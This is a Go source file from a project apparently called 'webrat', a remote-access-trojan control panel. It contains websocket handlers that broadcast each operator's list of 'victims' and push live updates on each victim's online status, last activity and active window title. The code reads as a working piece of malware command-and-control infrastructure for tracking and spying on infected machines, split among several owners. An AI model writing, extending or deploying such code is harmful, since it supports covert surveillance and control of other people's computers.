package ws

import (
	"encoding/json"
	"log"
	"strings"
	"time"

	"webrat-go-api/internal/storage"

	"github.com/gorilla/websocket"
)

func (h *Hub) broadcastVictims() {
	h.mu.RLock()
	clients := make([]*websocket.Conn, 0, len(h.clients))
	owners := make([]string, 0, len(h.clients))
	for c := range h.clients {
		clients = append(clients, c)
		owners = append(owners, strings.TrimSpace(h.clientOwners[c]))
	}
	h.mu.RUnlock()

	if len(clients) == 0 {
		return
	}

	for i, c := range clients {
		owner := strings.ToLower(strings.TrimSpace(owners[i]))
		h.mu.RLock()
		list := make([]*storage.Victim, 0, len(h.victims))
		hidden := h.hiddenVictimIDs[owner]
		for _, v := range h.victims {
			if owner != "" && strings.ToLower(strings.TrimSpace(v.Owner)) != owner {
				continue
			}
			if hidden != nil {
				if hidden[strings.TrimSpace(v.ID)] {
					continue
				}
			}
			vv := *v
			list = append(list, &vv)
		}
		h.mu.RUnlock()

		payload := map[string]any{
			"type":    "victims",
			"victims": list,
		}
		data, err := json.Marshal(payload)
		if err != nil {
			continue
		}

		m := h.getConnMutex(c)
		m.Lock()
		_ = c.SetWriteDeadline(time.Now().Add(15 * time.Second))
		if err := c.WriteMessage(websocket.TextMessage, data); err != nil {
			log.Println("broadcastVictims write:", err)
		}
		m.Unlock()
	}
}

func (h *Hub) broadcastSingleVictimUpdate(victimID string) {
	h.mu.RLock()
	v := h.victims[victimID]
	if v == nil {
		h.mu.RUnlock()
		return
	}
	vCopy := *v
	owner := strings.ToLower(strings.TrimSpace(vCopy.Owner))

	clients := make([]*websocket.Conn, 0)
	for c := range h.clients {
		cOwner := strings.ToLower(strings.TrimSpace(h.clientOwners[c]))
		if cOwner != "" && cOwner == owner {
			clients = append(clients, c)
		}
	}
	h.mu.RUnlock()

	if len(clients) == 0 {
		return
	}

	payload := map[string]any{
		"type":        "update",
		"id":          vCopy.ID,
		"online":      vCopy.Online,
		"last_active": vCopy.LastActive,
		"window":      vCopy.Window,
	}
	data, err := json.Marshal(payload)
	if err != nil {
		return
	}

	for _, c := range clients {
		m := h.getConnMutex(c)
		m.Lock()
		_ = c.SetWriteDeadline(time.Now().Add(15 * time.Second))
		_ = c.WriteMessage(websocket.TextMessage, data)
		m.Unlock()
	}
}
